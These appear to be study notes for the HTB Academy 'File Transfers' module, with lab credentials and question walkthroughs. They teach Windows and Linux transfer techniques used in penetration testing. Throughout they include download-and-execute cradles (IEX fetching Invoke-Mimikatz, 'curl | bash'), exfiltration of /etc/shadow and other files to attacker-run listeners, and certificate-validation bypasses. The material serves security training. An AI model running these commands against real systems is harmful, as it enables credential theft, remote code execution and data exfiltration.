# File Transfers — Windows Methods (HTB Academy)

Module: **File Transfers** · Section 2 — Windows File Transfer Methods

**Lab creds (RDP):** `htb-student` / `HTB_@cademy_stdnt!`

**QC:** Replace IPs (`192.168.x.x`), share names, and file paths with your Pwnbox/target values. Use only on authorized labs.

**Direction:**
- **Download** = get a file *onto* the Windows target (usually from your Pwnbox)
- **Upload** = send a file *off* the Windows target (usually to your Pwnbox)

---

## Why this matters

Windows ships with many tools that can move files. Attackers chain them to stay under the radar; defenders need to recognize the same patterns.

**Astaroth APT (short story):**
A phishing email dropped an LNK shortcut. That shortcut abused `WMIC` to pull JavaScript, which used `Bitsadmin` to download payloads, `Certutil` to Base64-decode them into DLLs, then `regsvr32` to load a DLL and inject the final malware into `userinit`.

**Takeaway:** “Fileless” does **not** mean nothing was transferred. It often means the payload never sat on disk as a normal `.exe` — it was decoded/run in memory using built-in Windows tools (LoLBins).

Later module sections cover more Living-Off-the-Land binaries on Windows and Linux.

---

## Download operations

### 1. PowerShell Base64 encode & decode (no network)

**What this is:** Turn a file into a long text string (Base64), copy/paste that string into the Windows shell, then rebuild the original file. No HTTP/SMB/FTP required.

**When to use:** Small files (keys, scripts, configs) when you already have a shell but network file transfer is blocked or awkward.

**How to think about it:**
1. On Pwnbox: fingerprint the file (`md5sum`), then encode it.
2. Copy the Base64 blob.
3. On Windows: decode blob → write bytes to disk.
4. Compare MD5 hashes so you know nothing got corrupted by copy/paste.

**Pwnbox — hash + encode**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

| Command | What it does |
|---------|----------------|
| `md5sum id_rsa` | Prints a fingerprint of the file so you can verify later |
| `cat id_rsa \| base64 -w 0` | Reads the file and encodes it as one long Base64 line (`-w 0` = no line wraps, easier to paste) |
| `echo` | Adds a newline after the blob so your terminal looks clean |

**Windows — decode to disk**

```powershell
[IO.File]::WriteAllBytes(
  "C:\Users\Public\id_rsa",
  [Convert]::FromBase64String("<BASE64_STRING>")
)

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

| Command | What it does |
|---------|----------------|
| `[Convert]::FromBase64String(...)` | Turns the pasted text back into raw bytes |
| `[IO.File]::WriteAllBytes("path", bytes)` | Writes those bytes to a file on disk |
| `Get-FileHash ... -Algorithm md5` | Same idea as Linux `md5sum` — confirm the file matches |

**Limits / gotchas:**
- `cmd.exe` can only handle strings up to about **8,191** characters — large files won’t paste.
- Web shells may reject huge POST/input strings.
- Fine for SSH keys/scripts; painful for big binaries/tools.

---

### 2. PowerShell web downloads (HTTP / HTTPS / FTP)

**What this is:** Use PowerShell’s built-in web client to pull a file from a URL hosted on your attack box (or the internet).

**When to use:** Most common lab/real-world option — companies usually allow outbound HTTP/HTTPS for browsing. Defenders may still block `.exe`, filter categories, or whitelist domains.

#### `Net.WebClient` building blocks

`System.Net.WebClient` is an older .NET class that can download over HTTP, HTTPS, or FTP.

| Method | What it returns / does | Simple meaning |
|--------|------------------------|----------------|
| `OpenRead` / `OpenReadAsync` | Stream | Open the remote file like a readable pipe |
| `DownloadData` / `DownloadDataAsync` | Byte array | Download raw bytes into memory |
| `DownloadFile` / `DownloadFileAsync` | Saves to disk | Classic “save this URL as a local file” |
| `DownloadString` / `DownloadStringAsync` | String | Download text (great for `.ps1` scripts) |

`*Async` versions start the download without freezing the PowerShell prompt while it runs.

#### DownloadFile — save to disk

**What this is:** Pull a remote file and write it to a path you choose.

```powershell
(New-Object Net.WebClient).DownloadFile(
  'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',
  'C:\Users\Public\Downloads\PowerView.ps1'
)

(New-Object Net.WebClient).DownloadFileAsync(
  'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
  'C:\Users\Public\Downloads\PowerViewAsync.ps1'
)
```

| Piece | What it does |
|-------|----------------|
| `New-Object Net.WebClient` | Creates a download helper object |
| `.DownloadFile(url, path)` | Downloads `url` and saves it as `path` |
| `.DownloadFileAsync(url, path)` | Same, but non-blocking (runs in background) |

#### DownloadString + IEX — fileless (run in memory)

**What this is:** Download a PowerShell script as text and execute it immediately without saving a `.ps1` file.

**Why attackers like it:** Less disk evidence; looks more like “PowerShell talked to the internet” than “malware.exe landed.”

```powershell
IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'
)

# Same idea with a pipeline
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

| Piece | What it does |
|-------|----------------|
| `.DownloadString(url)` | Fetches the script contents as a string |
| `IEX` / `Invoke-Expression` | Treats that string as PowerShell code and runs it |
| `... \| IEX` | Pipeline form — string flows into `IEX` |

#### Invoke-WebRequest (PowerShell 3.0+)

**What this is:** Newer, friendlier download cmdlet. Aliases: `iwr`, `curl`, `wget`. Often **slower** than `Net.WebClient`, but easier to read.

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

| Piece | What it does |
|-------|----------------|
| `Invoke-WebRequest <url>` | Requests the URL |
| `-OutFile PowerView.ps1` | Writes the response body to that filename |

More cradle variants (proxy-aware vs not, disk vs memory): Harmj0y’s PowerShell download cradles list.

#### Common PowerShell download errors

**A) Internet Explorer first-launch / HTML parsing error**

**What it means:** `Invoke-WebRequest` tried to use the IE engine to parse the page, but IE was never configured on the box.

```powershell
# Broken
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

# Fixed — skip IE HTML parsing, just get raw content
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

`-UseBasicParsing` = “don’t use Internet Explorer to understand the response.”

**B) SSL/TLS certificate trust error**

**What it means:** HTTPS cert is self-signed/untrusted, so .NET refuses the connection.

```powershell
# Lab-only bypass: accept any certificate
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'
)
```

That callback tells .NET “treat the cert as OK” so the download can proceed.

---

### 3. SMB downloads (TCP/445)

**What this is:** Host a Windows-style file share on your Linux Pwnbox, then use normal Windows `copy` / `net use` to pull files from `\\attacker\share`.

**When to use:** Internal networks where SMB is allowed between hosts. Very natural on Windows enterprise networks; often blocked outbound to the internet.

**Pwnbox — start an SMB share**

```bash
mkdir -p /tmp/smbshare
# put files you want to serve into /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

| Piece | What it does |
|-------|----------------|
| `mkdir -p /tmp/smbshare` | Folder that becomes the share contents |
| `impacket-smbserver share` | Share name clients will use (`\\IP\share`) |
| `-smb2support` | Enables SMB2 (needed for modern Windows) |
| `/tmp/smbshare` | Local directory being shared |

**Windows — pull a file**

```cmd
copy \\192.168.220.133\share\nc.exe
```

**Meaning:** “Copy `nc.exe` from the remote share into my current directory.”

**If guest access is blocked** (common on newer Windows):

Windows refuses anonymous SMB. Add a username/password on the Impacket server, then map a drive letter.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

| Command | What it does |
|---------|----------------|
| `net use n: \\IP\share /user:test test` | Maps drive `N:` to the share using credentials |
| `copy n:\nc.exe` | Copies from the mapped drive like a normal disk |

---

### 4. FTP downloads (TCP/21)

**What this is:** Run a simple FTP server on Pwnbox; Windows downloads with PowerShell or the built-in `ftp` client.

**When to use:** When HTTP/SMB aren’t ideal, or you want another protocol option. FTP is older and often monitored/blocked, but still appears in labs and legacy environments.

**Pwnbox — install and serve**

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

| Piece | What it does |
|-------|----------------|
| `pip3 install pyftpdlib` | Installs Python FTP server module |
| `python3 -m pyftpdlib --port 21` | Serves current directory over FTP on port 21 |
| (no user set) | Anonymous login allowed by default |
| (no `--port`) | Module defaults to **2121**, not 21 |

**PowerShell FTP download**

```powershell
(New-Object Net.WebClient).DownloadFile(
  'ftp://192.168.49.128/file.txt',
  'C:\Users\Public\ftp-file.txt'
)
```

**Meaning:** Same `DownloadFile` helper as HTTP, but URL starts with `ftp://`.

**Non-interactive FTP script (good for limited shells)**

**What this is:** Write FTP commands into a text file, then tell `ftp.exe` to run that file. Useful when you can’t babysit an interactive FTP prompt.

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

| Line / flag | What it does |
|-------------|--------------|
| `open IP` | Connect to the FTP server |
| `USER anonymous` | Log in anonymously |
| `binary` | Transfer raw bytes (don’t corrupt `.exe`/zips as text) |
| `GET file.txt` | Download remote `file.txt` to the local folder |
| `bye` | Quit |
| `ftp -n` | Don’t auto-login |
| `ftp -s:file` | Run commands from the script file |
| `ftp -v` | Show responses (verbose) |

---

## Upload operations

### 1. PowerShell Base64 encode → decode on Linux

**What this is:** Opposite of Base64 download. Encode a Windows file to text, paste it to your Pwnbox, decode back into a real file.

**When to use:** Small exfil (configs, hashes, short loot) when you only have clipboard/terminal paste and no upload channel.

```powershell
[Convert]::ToBase64String(
  (Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)
)

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

| Piece | What it does |
|-------|----------------|
| `Get-Content ... -Encoding byte` | Reads the file as raw bytes |
| `[Convert]::ToBase64String(...)` | Encodes those bytes as paste-friendly text |
| `Get-FileHash ... MD5` | Fingerprint before/after transfer |

```bash
echo <BASE64> | base64 -d > hosts
md5sum hosts
```

| Command | What it does |
|---------|----------------|
| `base64 -d` | Decodes the blob back to the original file |
| `md5sum hosts` | Confirms it matches the Windows hash |

---

### 2. PowerShell web uploads

**What this is:** Windows does **not** give you a simple built-in “UploadFile to any website” story like `DownloadFile` for every case. You either:
1. Use a helper script (`PSUpload.ps1`) against a Python upload server, or
2. POST Base64 data to a listener you control.

**When to use:** Outbound HTTP is open, but you need to get loot/tools *off* the target.

#### Method A — Python `uploadserver` + `PSUpload.ps1`

**What this is:** Pwnbox runs a tiny web server with an `/upload` endpoint. Windows loads a PowerShell function and POSTs a file to it.

```bash
pip3 install uploadserver
python3 -m uploadserver
# Browser/UI upload page: http://PWNBOX:8000/upload
```

| Command | What it does |
|---------|----------------|
| `pip3 install uploadserver` | Extends Python’s HTTP server with file upload support |
| `python3 -m uploadserver` | Listens (default port **8000**) and accepts uploads |

```powershell
IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'
)

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

| Piece | What it does |
|-------|----------------|
| `IEX DownloadString(...)` | Loads the upload helper script into memory |
| `Invoke-FileUpload -Uri ... -File ...` | POSTs the chosen file to the upload URL |

#### Method B — Base64 POST caught by Netcat

**What this is:** Encode the file, HTTP POST the blob to your listener, then decode on Pwnbox. No special upload server module required.

```powershell
$b64 = [System.Convert]::ToBase64String(
  (Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)
)
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
# copy the Base64 from the HTTP body
echo <base64> | base64 -d -w 0 > hosts
```

| Piece | What it does |
|-------|----------------|
| `$b64 = ...` | Stores Base64 of the file in a variable |
| `Invoke-WebRequest -Method POST -Body $b64` | Sends that text to your listener as an HTTP POST |
| `nc -lvnp 8000` | Listens on TCP 8000 and prints whatever arrives |
| `base64 -d` | Rebuilds the file from the caught blob |

---

### 3. SMB / WebDAV uploads

**What this is:** Push files from Windows to your attack host using share syntax (`\\IP\something`).

**Important catch:** Many companies **block outbound SMB (445)** so malware can’t talk SMB to the internet. If 445 is open inside the lab, normal Impacket SMB works for uploads too (`copy file \\IP\share\`).

**WebDAV workaround:** WebDAV makes an HTTP server behave like a folder share. Windows may try SMB first, then fall back to HTTP WebDAV automatically.

#### WebDAV server on Pwnbox

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

| Piece | What it does |
|-------|----------------|
| `wsgidav` | WebDAV server |
| `cheroot` | HTTP server engine WsgiDAV uses |
| `--host=0.0.0.0` | Listen on all interfaces |
| `--port=80` | HTTP port (looks like normal web traffic) |
| `--root=/tmp` | Folder clients can read/write |
| `--auth=anonymous` | No password (lab convenience) |

#### Windows — browse and upload

```cmd
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

| Command | What it does |
|---------|----------------|
| `dir \\IP\DavWWWRoot` | Lists the WebDAV root as if it were a network folder |
| `copy file \\IP\DavWWWRoot\` | Uploads by copying into that “share” |
| `copy file \\IP\sharefolder\` | Same, but to a real folder name on the WebDAV root |

**`DavWWWRoot` meaning:** Special Windows keyword meaning “connect to the root of this WebDAV server.” It is **not** an actual folder that must exist on the Linux side.

If outbound 445 works, you can skip WebDAV and use `impacket-smbserver` exactly like the download section — just `copy` from Windows toward `\\IP\share\`.

---

### 4. FTP uploads

**What this is:** Same FTP server as downloads, but started with write permission so the client can `PUT` / `UploadFile`.

**When to use:** You already have FTP allowed, or you’re practicing alternate channels.

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

| Flag | What it does |
|------|----------------|
| `--write` | Allows clients to upload (without this, downloads-only) |

**PowerShell upload**

```powershell
(New-Object Net.WebClient).UploadFile(
  'ftp://192.168.49.128/ftp-hosts',
  'C:\Windows\System32\drivers\etc\hosts'
)
```

**Meaning:** Read local `hosts` and store it on the FTP server as remote name `ftp-hosts`.

**FTP script upload (PUT)**

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

Same scripting idea as FTP download, but `PUT` sends a **local** file to the server instead of `GET` pulling one down.

---

## Quick cheat sheet

| Goal | Plain-English idea | Attack host | Target |
|------|--------------------|-------------|--------|
| Small file, no network | Paste file as text | `base64 -w 0` | Decode with `[IO.File]::WriteAllBytes` |
| HTTP(S) download to disk | “Save URL as file” | `python3 -m http.server` | `WebClient.DownloadFile` / `IWR -OutFile` |
| Fileless PS | Download script & run in RAM | Host the `.ps1` | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| SMB transfer | Windows file share | `impacket-smbserver` (+ user/pass if needed) | `copy \\IP\share\file` / `net use` |
| FTP transfer | Old-school file server | `pyftpdlib --port 21` [`--write` for upload] | `DownloadFile` / `UploadFile` or `ftp -s:` |
| HTTP upload | POST file to your web server | `python3 -m uploadserver` | `Invoke-FileUpload` or Base64 `IWR -Method POST` |
| WebDAV upload | Make HTTP look like a share | `wsgidav --port=80 ...` | `copy \\IP\DavWWWRoot\file` |

---

## Academy questions (Section 2)

### Q1 — wget a flag from web root

**What they want:** From Pwnbox, download `flag.txt` sitting at the target’s web root, then submit the text inside.

```bash
# QC: TARGET = spawned machine IP
wget http://TARGET/flag.txt
cat flag.txt
```

| Command | What it does |
|---------|----------------|
| `wget http://TARGET/flag.txt` | Downloads the file over HTTP into the current directory |
| `cat flag.txt` | Prints the flag contents to submit |

### Q2 — upload zip, hash the payload

**What they want:** RDP in, get `upload_win.zip` onto the Windows box, extract it, run `hasher` on `upload_win.txt`, submit the hash.

```text
RDP: htb-student / HTB_@cademy_stdnt!
```

Example with SMB:

```bash
# Pwnbox — serve the zip
mkdir -p /tmp/smbshare
cp upload_win.zip /tmp/smbshare/
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
:: Windows (RDP)
net use n: \\PWNBOX_IP\share /user:test test
copy n:\upload_win.zip C:\Users\Public\
cd C:\Users\Public
tar -xf upload_win.zip
hasher upload_win.txt
```

| Step | What it does |
|------|----------------|
| Impacket share | Makes the zip available as `\\Pwnbox\share\upload_win.zip` |
| `net use` + `copy` | Authenticates and pulls the zip onto Windows |
| `tar -xf` / `Expand-Archive` | Unzips archive |
| `hasher upload_win.txt` | Lab binary that prints the hash you submit |

### Optional Exercise 1

Practice several upload/download methods over RDP until you’re comfortable, then submit: `DONE`.

---

## Appendix — RDP from Linux (optional)

**What this is:** Q2 and the optional exercise want you on the Windows target over RDP. From Kali/Pwnbox the go-to client is **xfreerdp**; **Remmina** is a GUI alternative, and `rdesktop` is the older fallback.

**When to use:** Any time you need the Windows desktop (run `hasher`, drive the GUI, drag files) instead of just a shell.

### xfreerdp (recommended, CLI)

```bash
sudo apt update
sudo apt install -y freerdp2-x11
```

Basic connect:

```bash
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:TARGET_IP
```

With quality-of-life + a mounted folder for file transfer:

```bash
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:TARGET_IP \
  /dynamic-resolution +clipboard /cert:ignore /drive:share,/tmp/smbshare
```

| Flag | What it does |
|------|----------------|
| `/u` `/p` `/v` | Username, password, target IP (`/d:DOMAIN` if domain-joined) |
| `/dynamic-resolution` | Session resizes with the window |
| `+clipboard` | Copy/paste between Kali and Windows |
| `/cert:ignore` | Skip the self-signed certificate prompt |
| `/drive:share,/tmp/smbshare` | Mounts a local folder into the session as a drive — a quick file-transfer path |

**QC:** Single-quote the password so shell specials like `@` and `!` aren’t interpreted.

### Remmina (GUI)

```bash
sudo apt install -y remmina remmina-plugin-rdp
remmina
```

Then: new connection → protocol **RDP** → enter IP / user / password.

### Newer Kali (FreeRDP 3)

The binary may be `xfreerdp3`:

```bash
sudo apt install -y freerdp3-x11
xfreerdp3 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:TARGET_IP
```

**Bonus:** `/drive:` mounting is itself a file-transfer method — anything in the mapped folder shows up as a drive inside the RDP session, no SMB/FTP server needed.

---

## Recap

| Method | One-line description |
|--------|----------------------|
| Base64 paste | Move small files through the terminal with no file-transfer protocol |
| PowerShell web download | Pull files/scripts over HTTP(S)/FTP; can save to disk or run in memory |
| SMB | Classic Windows share transfer using Impacket + `copy`/`net use` |
| FTP | Simple alternate protocol with built-in Windows client or PowerShell |
| HTTP upload / PSUpload | Send files out over HTTP to a listener that accepts uploads |
| WebDAV | When outbound SMB is blocked, reuse share-style `copy` over HTTP |

More tools and LoLBin techniques appear in later sections of the module.

---
---

# File Transfers — Linux Methods (HTB Academy)

Module: **File Transfers** · Section 3 — Linux File Transfer Methods

**Lab creds (SSH):** `htb-student` / `HTB_@cademy_stdnt!`

**QC:** Replace IPs (`192.168.x.x` / `10.x.x.x`) and paths with your Pwnbox/target values. Authorized labs only.

**Direction:** download = get a file *onto* the Linux target (from Pwnbox) · upload = send a file *off* the target (to Pwnbox).

---

## Why this matters

Linux boxes ship with many tools that can move files, so attackers rarely need to drop a custom downloader. A real incident-response example: a threat actor exploited SQL injection, then ran a Bash script that tried **cURL first, then wget, then Python** to pull second-stage malware from a command-and-control server — all over HTTP.

**Takeaway:** Linux can do FTP/SMB like Windows, but the overwhelming majority of malware uses **HTTP/HTTPS** because it blends in with normal outbound traffic. Learn the HTTP paths first, keep SSH/SCP and `/dev/tcp` as fallbacks.

---

## Download operations

### 1. Base64 encode & decode (no network)

**What this is:** Encode a file to Base64 text on one host, paste it into the other host's terminal, decode back to the original bytes. No network transfer.

**When to use:** Small files (SSH keys, scripts) when you have a shell but no working HTTP/SSH channel.

**Pwnbox — hash + encode**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

| Command | What it does |
|---------|----------------|
| `md5sum id_rsa` | Fingerprint to verify the transfer later |
| `base64 -w 0` | Encode with no line wraps (one clean line to copy) |
| `; echo` | Print a newline after the blob for easy selection |

**Linux target — decode**

```bash
echo -n '<BASE64_STRING>' | base64 -d > id_rsa
md5sum id_rsa
```

| Piece | What it does |
|-------|----------------|
| `echo -n '...'` | Emit the pasted blob without a trailing newline |
| `base64 -d` | Decode back to the original bytes |
| `> id_rsa` | Write the rebuilt file |
| `md5sum` | Confirm it matches the Pwnbox hash |

**Reverse (upload):** on the compromised target `cat file | base64 -w 0`, paste to Pwnbox, `base64 -d` there.

---

### 2. Web downloads with wget and cURL

**What this is:** The two most common Linux HTTP clients. Point them at a URL and save the response.

**When to use:** Default choice — outbound HTTP/HTTPS is almost always allowed.

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

| Piece | What it does |
|-------|----------------|
| `wget <url> -O <file>` | Download to a chosen path (uppercase `-O`) |
| `curl -o <file> <url>` | Same idea in cURL (lowercase `-o`) |

---

### 3. Fileless execution with pipes

**What this is:** Download and run in one step by piping the download straight into an interpreter — nothing is saved to disk.

**When to use:** Run recon/exploit scripts while minimizing disk artifacts.

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

| Piece | What it does |
|-------|----------------|
| `curl <url> \| bash` | Pipe the script text directly into Bash |
| `wget -qO-` | `-q` quiet, `-O-` write to stdout (so it can be piped) |
| `\| python3` | Execute the fetched script in the interpreter |

**QC:** "Fileless" isn't guaranteed — some payloads (e.g. `mkfifo`-based) still write temp files.

---

### 4. Download with Bash `/dev/tcp`

**What this is:** When `curl`/`wget`/`python` are all missing, Bash's built-in `/dev/tcp` pseudo-device can speak raw HTTP.

**When to use:** Minimal/locked-down hosts. Needs Bash ≥ 2.04 compiled with `--enable-net-redirections`.

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

| Line | What it does |
|------|----------------|
| `exec 3<>/dev/tcp/IP/80` | Open a TCP socket to the web server on file descriptor 3 |
| `echo -e "GET ... " >&3` | Send a raw HTTP GET request into the socket |
| `cat <&3` | Read the HTTP response back (headers + body) |

---

### 5. SSH / SCP downloads

**What this is:** `scp` copies files over SSH. Run an SSH server on Pwnbox, pull from it to the target.

**When to use:** SSH (TCP/22) is reachable; you want an encrypted, authenticated transfer.

**Pwnbox — enable SSH server**

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt        # confirm 0.0.0.0:22 LISTEN
```

**Target — pull a file with SCP**

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

| Piece | What it does |
|-------|----------------|
| `systemctl enable/start ssh` | Turn on the SSH server (persist + run now) |
| `netstat -lnpt` | Verify sshd is listening on 22 |
| `scp user@IP:/remote/path .` | Copy remote file to the current directory (syntax mirrors `cp`) |

**QC:** Consider a throwaway user for transfers instead of your main creds/keys.

---

## Upload operations

The download methods work in reverse for uploads too. A few upload-specific setups:

### 1. HTTPS web upload (uploadserver)

**What this is:** Python `uploadserver` adds an `/upload` endpoint to the built-in HTTP server; here it's run over HTTPS with a self-signed cert.

**When to use:** Pull loot off the target over an encrypted channel that looks like normal web traffic.

**Pwnbox — install, make cert, serve**

```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

| Piece | What it does |
|-------|----------------|
| `pip install --user uploadserver` | Adds the upload-capable server module |
| `openssl req -x509 ...` | Generates a self-signed cert+key (`server.pem`) |
| `mkdir https && cd https` | Serve from a clean dir so the cert isn't exposed as a download |
| `uploadserver 443 --server-certificate` | HTTPS upload server on port 443 |

**Target — upload files**

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

| Piece | What it does |
|-------|----------------|
| `-X POST .../upload` | POST to the upload endpoint |
| `-F 'files=@/path'` | Attach a file (repeat `-F` for multiple) |
| `--insecure` | Accept the self-signed cert |

---

### 2. Quick web server to pull from the target

**What this is:** Stand up a one-line web server *on the target* (or on Pwnbox) and fetch its files from the other side.

**When to use:** Fast, dependency-light transfer using whatever runtime the box already has. Great when you can reach the server's port.

```bash
python3 -m http.server                 # serves cwd on :8000
python2.7 -m SimpleHTTPServer           # legacy Python
php -S 0.0.0.0:8000                     # PHP built-in server
ruby -run -ehttpd . -p8000             # Ruby WEBrick
```

Then from the other host:

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

| Piece | What it does |
|-------|----------------|
| `python3 -m http.server` | Serve the current directory over HTTP on 8000 |
| `php -S 0.0.0.0:8000` | Same via PHP's dev server |
| `ruby -run -ehttpd . -p8000` | Same via Ruby WEBrick |
| `wget IP:8000/file` | Download the served file from the other host |

**QC:** Inbound to a *newly opened* port may be firewalled. Serving from the target and pulling to Pwnbox (target's port reachable) often works when the reverse doesn't.

---

### 3. SCP upload

**What this is:** Same `scp`, other direction — push a local file onto the target over SSH.

**When to use:** SSH (TCP/22) to the target is allowed.

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

**Meaning:** Copy local `/etc/passwd` into the target user's home dir. Syntax mirrors `cp` — source first, `user@IP:/dest` second.

---

## Quick cheat sheet (Linux)

| Goal | Plain-English idea | Command |
|------|--------------------|---------|
| Small file, no network | Paste as Base64 text | `base64 -w 0` → `base64 -d > file` |
| HTTP download | Save a URL | `wget -O` / `curl -o` |
| Fileless run | Download & execute in RAM | `curl URL \| bash` / `wget -qO- URL \| python3` |
| No download tools | Raw HTTP via Bash | `exec 3<>/dev/tcp/IP/80` |
| SSH pull | Encrypted copy from Pwnbox | `scp user@IP:/path .` |
| HTTPS upload | POST loot to your server | `uploadserver 443` + `curl -F --insecure` |
| Serve & pull | One-line web server | `python3 -m http.server` + `wget IP:8000/file` |
| SSH push | Encrypted copy to target | `scp file user@IP:/dest` |

---

## Academy questions (Section 3)

### Q1 — Python-served flag

**What they want:** Download `flag.txt` from the target's web root using a **Python** web server, submit its contents.

```bash
# On target (or wherever the web root is): python3 -m http.server
# From Pwnbox:
wget http://TARGET:8000/flag.txt
cat flag.txt
```

### Q2 — upload zip, SSH in, hash it

**What they want:** Upload `upload_nix.zip`, SSH in, extract, run `hasher <extracted file>`, submit the hash.

```text
SSH: htb-student / HTB_@cademy_stdnt!
```

Example (serve from Pwnbox, pull on target, then SSH to run):

```bash
# Pwnbox — serve the zip
python3 -m http.server 8000
```

```bash
# Target (via SSH)
ssh htb-student@TARGET
wget http://PWNBOX:8000/upload_nix.zip
unzip upload_nix.zip
hasher <extracted_file>
```

Or push it directly with SCP:

```bash
scp upload_nix.zip htb-student@TARGET:/home/htb-student/
```

### Optional Exercise 1

Practice upload/download methods over SSH until comfortable, then submit: `DONE`.

---

## Recap (Linux)

| Method | One-line description |
|--------|----------------------|
| Base64 paste | Move small files through the terminal, no protocol needed |
| wget / curl | Standard HTTP(S) download clients |
| Fileless pipe | `curl/wget ... \| bash/python3` to run without touching disk |
| `/dev/tcp` | Bash-only raw HTTP when no download tools exist |
| SCP | Encrypted file copy over SSH, both directions |
| uploadserver (HTTPS) | Receive uploads over TLS with a self-signed cert |
| http.server / php / ruby | One-line web servers to serve-and-pull files |

More tools and techniques appear in later sections of the module.

---
---

# File Transfers — With Code (HTB Academy)

Module: **File Transfers** · Section 4 — Transferring Files with Code

**Lab creds (SSH):** `htb-student` / `HTB_@cademy_stdnt!` · target seen in lab: `ACADEMY-MISC-NIX04`

**QC:** Replace IPs/paths with your Pwnbox/target values. Authorized labs only.

---

## Why this matters

Targets often have an interpreter installed even when the usual transfer tools are missing. **Python, PHP, Perl, Ruby** are common on Linux (and sometimes Windows); Windows can also run **JavaScript/VBScript** via `cscript`/`mshta`. Any of these can download, upload, or execute — so a language runtime is itself a file-transfer tool. The examples below are one-liners you can paste into a shell.

**Pattern:** most of these fetch over HTTP(S), mirroring the `curl → wget → python` fallback chain real malware uses.

---

## Download with code

### Python

**What this is:** Python one-liners (via `-c`) that fetch a URL to a file. Syntax differs between Python 2 and 3.

**When to use:** Python is present (extremely common on Linux); `curl`/`wget` missing or filtered.

```bash
# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

| Piece | What it does |
|-------|----------------|
| `-c '...'` | Run the inline program |
| `urllib.urlretrieve` (py2) / `urllib.request.urlretrieve` (py3) | Download URL → save as second arg |

### PHP

**What this is:** PHP one-liners (via `-r`) using three approaches — `file_get_contents`, `fopen`, or fetch-and-pipe to Bash.

**When to use:** On web servers — PHP is very widely deployed, so it's often already there.

```bash
# file_get_contents + file_put_contents
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# fopen streaming (buffered read/write)
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

